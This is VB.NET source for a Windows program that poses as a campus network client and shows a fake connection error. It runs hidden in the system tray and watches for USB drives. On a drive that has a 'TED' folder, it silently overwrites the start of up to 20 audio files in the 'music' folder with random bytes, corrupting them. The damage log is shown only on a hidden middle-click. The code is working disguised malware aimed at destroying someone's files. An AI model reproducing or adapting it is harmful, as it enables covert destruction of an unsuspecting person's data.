Imports System.ComponentModel
Imports System.IO
Imports System.Text

Public Class Form2
    Public Const WM_DEVICECHANGE = &H219
    Public Const DBT_DEVICEARRIVAL = &H8000
    Public Const DBT_CONFIGCHANGECANCELED = &H19
    Public Const DBT_CONFIGCHANGED = &H18
    Public Const DBT_CUSTOMEVENT = &H8006
    Public Const DBT_DEVICEQUERYREMOVE = &H8001
    Public Const DBT_DEVICEQUERYREMOVEFAILED = &H8002
    Public Const DBT_DEVICEREMOVECOMPLETE = &H8004
    Public Const DBT_DEVICEREMOVEPENDING = &H8003
    Public Const DBT_DEVICETYPESPECIFIC = &H8005
    Public Const DBT_DEVNODES_CHANGED = &H7
    Public Const DBT_QUERYCHANGECONFIG = &H17
    Public Const DBT_USERDEFINED = &HFFFF
    Public md5s As List(Of String)
    Public real_close As Boolean

    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
        If m.Msg = WM_DEVICECHANGE Then
            Select Case m.WParam
                Case WM_DEVICECHANGE
                Case DBT_DEVICEARRIVAL 'U盘插入
                    Dim s() As DriveInfo = DriveInfo.GetDrives
                    For Each drive As DriveInfo In s
                        If drive.DriveType = DriveType.Removable Then
                            ListBox1.Items.Add("U盘已插入！盘符为:" + drive.Name.ToString())
                            Dim t As New Timer
                            t.Interval = 1000
                            t.Tag = drive
                            AddHandler t.Tick, AddressOf check_file
                            t.Start()
                        End If
                    Next

                Case DBT_CONFIGCHANGECANCELED
                Case DBT_CONFIGCHANGED
                Case DBT_CUSTOMEVENT
                Case DBT_DEVICEQUERYREMOVE
                Case DBT_DEVICEQUERYREMOVEFAILED
                Case DBT_DEVICEREMOVECOMPLETE 'U盘卸载
                    ListBox1.Items.Add("U盘卸载！")
                Case DBT_DEVICEREMOVEPENDING
                Case DBT_DEVICETYPESPECIFIC
                Case DBT_DEVNODES_CHANGED
                Case DBT_QUERYCHANGECONFIG
                Case DBT_USERDEFINED
            End Select
        End If
        MyBase.WndProc(m)
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ListBox1.Items.Add("请您现在插入U盘至USB接口！")
        NotifyIcon1.Icon = Me.Icon
        NotifyIcon1.Text = "校园网客户端"
        NotifyIcon1.Visible = True

    End Sub

    Private Sub check_file(sender As Object, e As EventArgs)
        sender.stop()
        Dim di As DriveInfo = TryCast(sender.tag, DriveInfo)
        'If di.VolumeLabel <> "U 盘" Then Exit Sub
        If Not System.IO.Directory.Exists(di.Name & "TED\") Then Exit Sub
        Dim dir = New DirectoryInfo(di.Name & "music\")
        Dim i As Int32
        For Each finfo As FileInfo In dir.GetFiles
            If ".ape.mp3.flac.wav.m4a.dsd".Contains(finfo.Extension.ToLower) Then
                i = i + 1
                ListBox1.Items.Add("已损坏：" & finfo.FullName)
                'finfo.Delete()
                destroy(finfo.FullName)
                If i = 20 Then Exit For
            End If
        Next
    End Sub

    Private Sub destroy(f As String)
        Dim writer As StreamWriter = New StreamWriter(File.OpenWrite(f))

        writer.BaseStream.Seek(1, SeekOrigin.Begin)
        Dim buffer As New List(Of Byte)
        Dim i
        Randomize()
        For i = 0 To 100
            buffer.Add(Rnd() * 255)
        Next
        writer.Write(Encoding.GetEncoding("GB2312").GetString(buffer.ToArray))
        writer.Flush()
        writer.Close()
    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Me.Show()
    End Sub

    Private Sub Form2_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        If real_close Then
        Else
            ListBox1.Visible = False
            Me.Height = 246
            e.Cancel = True
            Me.Hide()
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        real_close = True
        Me.Close()
    End Sub


    Private Sub Button1_MouseClick(sender As Object, e As MouseEventArgs) Handles Button1.MouseUp
        If e.Button = MouseButtons.Left Then
            MessageBox.Show("无法连接到服务器！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error)
        ElseIf e.Button = MouseButtons.Middle Then
            ListBox1.Visible = True
        End If
    End Sub
End Class
